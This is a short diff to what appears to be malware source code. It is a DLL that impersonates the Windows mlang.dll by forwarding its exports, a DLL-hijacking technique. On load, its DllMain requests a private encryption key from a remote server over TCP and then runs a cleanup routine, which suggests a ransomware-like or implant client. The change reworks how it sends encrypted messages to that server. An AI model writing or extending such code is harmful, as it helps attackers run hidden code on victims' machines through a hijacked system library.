@@ -3,7 +3,6 @@
 #include "../../Headers/syscalls.h"
 #include "../../Headers/client.h"
 #include "../../Headers/net_common.h"
-#include "../../Headers/aes.hpp"
 
 #pragma comment(linker, "/export:IsConvertINetStringAvailable=C:\\Windows\\System32\\mlang.IsConvertINetStringAvailable,@110")
 #pragma comment(linker, "/export:ConvertINetString=C:\\Windows\\System32\\mlang.ConvertINetString,@111")
@@ -75,7 +74,7 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 		req.action = req.REQUEST_PRIVATE_ENCRYPTION_KEY;
 		req.tcp = me.GetTCPSocket();
 		req.valid = TRUE;
-		me.MakeServerRequest(req, FALSE);
+		me.TCPSendEncryptedMessageToServer(req);
 
 		ProcessUtilities::Clean();
 
